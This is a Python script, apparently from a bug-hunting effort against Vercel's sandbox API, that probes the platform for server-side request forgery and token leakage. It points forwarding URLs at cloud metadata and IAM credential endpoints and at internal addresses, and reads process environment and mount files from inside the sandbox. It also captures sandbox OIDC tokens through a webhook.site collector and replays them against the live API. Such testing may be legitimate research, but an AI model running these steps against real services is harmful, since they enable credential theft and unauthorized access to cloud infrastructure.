# -*- coding: utf-8 -*-
"""Phase19: 补齐遗漏面 - forwardURL SSRF / aud substring / 创建API字段 / DELETE归属 / guest残留"""
import sys, time, json, base64, re, urllib.request, urllib.error
sys.path.insert(0, r'D:\scan\skills\non-traditional-vuln-hunting')
from fw_driver import api, cmd, TEAM, PROJ, fresh_sandbox_deny_all

WH = "57dad648-5daa-4ef8-8532-0d5dd3ceab68"

def decode_jwt(t):
    try:
        p = t.split('.')[1]
        p += '=' * (-len(p) % 4)
        return json.loads(base64.urlsafe_b64decode(p))
    except Exception:
        return {}

GUEST = r'''
import subprocess, os, socket
def curl(args):
    r = subprocess.run(['curl', '-s', '-m', '8', '-k'] + args, capture_output=True, text=True)
    print('---', ' '.join(args)[:110], flush=True)
    print('RC=%d OUT:%s' % (r.returncode, r.stdout[:300].replace(chr(10),' ')), flush=True)
curl(['https://api.vercel.com/'])
# guest 残留检查
try:
    e = open('/proc/1/environ', 'rb').read().replace(b'\x00', b'|')
    print('[proc1-env] %s' % e[:600], flush=True)
except Exception as ex:
    print('[proc1-env] ERR %s' % ex, flush=True)
try:
    print('[mountinfo] %s' % open('/proc/self/mountinfo').read()[:800].replace(chr(10),' || '), flush=True)
except Exception as ex:
    print('[mountinfo] ERR %s' % ex, flush=True)
try:
    print('[if_inet6] %s' % open('/proc/net/if_inet6').read().replace(chr(10),' '), flush=True)
except Exception as ex:
    print('[if_inet6] ERR %s' % ex, flush=True)
try:
    print('[vercel-dir] %s' % os.listdir('/vercel'), flush=True)
except Exception as ex:
    print('[vercel-dir] ERR %s' % ex, flush=True)
# h2c 明文
try:
    s = socket.create_connection(('34.195.135.204', 80), timeout=5)
    s.sendall(b'PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n')
    s.settimeout(3)
    r2 = s.recv(100)
    print('[h2c] resp %r' % r2, flush=True)
    s.close()
except Exception as ex:
    print('[h2c] ERR %s' % ex, flush=True)
print('done', flush=True)
'''
code = "cat > /tmp/pg27.py <<'PYEOF'\n" + GUEST + "\nPYEOF\npython3 /tmp/pg27.py"

def get_wh():
    try:
        req = urllib.request.Request("https://webhook.site/token/%s/requests?sorting=newest" % WH)
        with urllib.request.urlopen(req, timeout=15) as r:
            d = json.loads(r.read().decode())
            return d if isinstance(d, dict) else {'data': []}
    except Exception as e:
        return {'err': str(e)}

if __name__ == "__main__":
    # ========== A: forwardURL 内网 SSRF ==========
    print('=== A: forwardURL 内网 SSRF ===', flush=True)
    sid = fresh_sandbox_deny_all("fwtest9")
    time.sleep(2)
    targets = [
        ("meta-https", "https://169.254.169.254/latest/meta-data/"),
        ("meta-http", "http://169.254.169.254/latest/meta-data/"),
        ("meta-iam", "https://169.254.169.254/latest/meta-data/iam/security-credentials/"),
        ("dns-ip", "http://172.31.0.2/"),
        ("gw-ip", "http://100.64.0.1/"),
        ("localhost", "http://127.0.0.1/"),
        ("ctrl-httpbin", "https://httpbin.org/anything"),
    ]
    for label, fwd in targets:
        body = {"allow": {"api.vercel.com": [{"match": {"path": {"startsWith": "/"}}, "forwardURL": fwd}]}}
        c, r = api("POST", "/v2/sandboxes/sessions/%s/network-policy?teamId=%s" % (sid, TEAM), body)
        if c != 200:
            print('[%s] set fwd %s -> %d %s' % (label, fwd[:50], c, r[:120]), flush=True)
            continue
        print('[%s] set fwd OK' % label, flush=True)
        time.sleep(1)
        c, r = cmd(sid, "bash", ["-lc", code], timeout_ms=60000)
        outs = re.findall(r'RC=\d+ OUT:([^\x00]{0,400})', r)
        for o in outs:
            print('[%s] guest: %s' % (label, o[:280]), flush=True)

    # ========== B: aud substring 变体 ==========
    print('\n=== B: aud substring 变体 ===', flush=True)
    fwd = "https://httpbin.org/anything?api.vercel.com=token&x=%s" % WH
    body = {"allow": {"api.vercel.com": [{"match": {"path": {"startsWith": "/"}}, "forwardURL": fwd}]}}
    c, r = api("POST", "/v2/sandboxes/sessions/%s/network-policy?teamId=%s" % (sid, TEAM), body)
    print('set fwd(substring):', c, r[:150], flush=True)
    if c == 200:
        time.sleep(1)
        c, r = cmd(sid, "bash", ["-lc", code], timeout_ms=60000)
        outs = re.findall(r'RC=\d+ OUT:([^\x00]{0,400})', r)
        for o in outs:
            print('[B] guest: %s' % o[:280], flush=True)
        time.sleep(3)
        d = get_wh()
        if 'err' in d:
            print('[B] wh err:', d['err'], flush=True)
        else:
            items = d.get('data', [])[:3]
            for it in items:
                hdrs = {h["name"].lower(): h["value"] for h in it.get("headers", [])}
                tok = hdrs.get("vercel-sandbox-oidc-token", "")
                if tok:
                    aud = decode_jwt(tok).get('aud', '')
                    print('[B] wh got token, aud=%s' % aud, flush=True)
                    # 用该 token 调 API 测 substring 校验
                    req = urllib.request.Request("https://api.vercel.com/v2/user")
                    req.add_header("Authorization", "Bearer " + tok)
                    try:
                        with urllib.request.urlopen(req, timeout=20) as rr:
                            print('[B] token -> /v2/user:', rr.status, rr.read().decode()[:200], flush=True)
                    except urllib.error.HTTPError as ee:
                        print('[B] token -> /v2/user:', ee.code, ee.read().decode()[:200], flush=True)
                    break

    # ========== C: 创建沙箱 API 字段注入 ==========
    print('\n=== C: 创建沙箱额外字段 ===', flush=True)
    for field in [{"image": "docker.io/library/alpine:latest"}, {"runtime": "custom"},
                  {"dockerImage": "ubuntu:latest"}, {"image": "alpine"}, {"template": "custom"}]:
        body = {"projectId": PROJ, "name": "fwtestX", "networkPolicy": {"mode": "deny-all"}}
        body.update(field)
        c, r = api("POST", "/v2/sandboxes?teamId=%s" % TEAM, body)
        print('[field=%s] -> %d %s' % (list(field)[0], c, r[:200]), flush=True)
        time.sleep(1)
    # ========== D: DELETE 归属校验 ==========
    print('\n=== D: DELETE name 归属 ===', flush=True)
    for name, team in [("fwtest9", TEAM), ("fwtest9", "team_notexist"), ("nonexistent-name-xyz", TEAM)]:
        c, r = api("DELETE", "/v2/sandboxes/%s?teamId=%s&projectId=%s" % (name, team, PROJ))
        print('[DELETE %s team=%s] -> %d %s' % (name, team[:12], c, r[:150]), flush=True)
        time.sleep(1)
    print('done', flush=True)
